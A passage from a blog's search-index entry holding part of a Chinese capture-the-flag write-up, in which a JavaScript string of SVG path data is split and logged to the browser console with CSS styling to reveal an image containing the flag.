79.249122,29.337219 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 106.868818,-7.460739 -10.0585,0.731527 -3.10899,7.315272 0.73153,5.852215 2.74322,3.108989 8.77833,0.182883 0.73152,-0.182883 m -29.84386,-8.105803 8.77833,-0.365762 2.0117,-2.743227 -2.37747,-3.291872 h -8.9612 l -2.19458,4.0234 0.18288,7.863914 3.29187,2.560347 8.0468,-0.365766 m -36.86029,-9.455308 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m -5.20252,-3.51165 -7.58959,-0.182882 -2.28602,3.931959 V 32.0765 l 8.86976,0.182882 1.5545,1.554493 -0.27433,4.206283 -1.46305,2.377461 -8.32112,0.09144 h 0.4572 m -17.006391,0.457205 -0.18288,-12.070196 2.56034,-3.840517 6.766631,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 m -32.373283,-17.720279 -10.058498,0.731527 -3.108989,7.315272 0.731526,5.852215 2.743226,3.108989 8.778325,0.182883 0.731528,-0.182883 m -15.544951,1.645936 0.731528,0.365766 -4.0234,-2.926109 L 56.87623,24.689039 53.401478,22.128694 57.607759,18.836823 57.241995,6.5837438 59.985222,3.4747537 m -17.008004,34.0160083 8.961204,-0.18288 v 0 m -8.961204,0.18288 -0.182883,-10.058495 9.144087,-0.182883 v 22.860222 h -8.961204 l 0.548645,-0.365765 H 43.34298 m -15.54495,-27.98091 5.852215,-0.182882 0.182883,16.276478 m -0.365763,-10.790025 -7.13239,0.182882 V 38.22229 l 12.43596,-0.365763 V 37.490762 M 19.202586,12.43596 l -0.182882,26.152093 4.206281,-0.18288 0.182882,-0.365766 M 14.996305,12.618842 H 10.241379 L 10.058498,38.039407 5.8522165,37.856527 M 3.8405173,22.67734 15.910714,22.494458\&#x27; %2F%3E %3C%2Fsvg%3E&quot;)||console.log||console.clear||Math.random||Math.floor||setTimeout&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b=a[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//将字符串 a 按 &#x27;||&#x27; 分隔符分割成多个子字符串，并返回一个数组，使用索引从分割后的数组中获取相应元素</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%c &#x27;</span>,b);</span><br><span class="line"><span class="comment">//将b的值输出到控制台，%c 是一个格式占位符，通常与 console.log 的第二个参数一起使用，用于应用 CSS 样式到输出的文本</span></span><br></pre></td></tr></table></figure><p>第一张图</p><p><img src="/2024/05/18/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/image-20240427170855343.png" alt="image-20240427170855343"></p><p>第二张图就是flag了</p><p><img src="/2024/05/18/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/image-20240427171014728.png" alt="image-20240427171014728"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
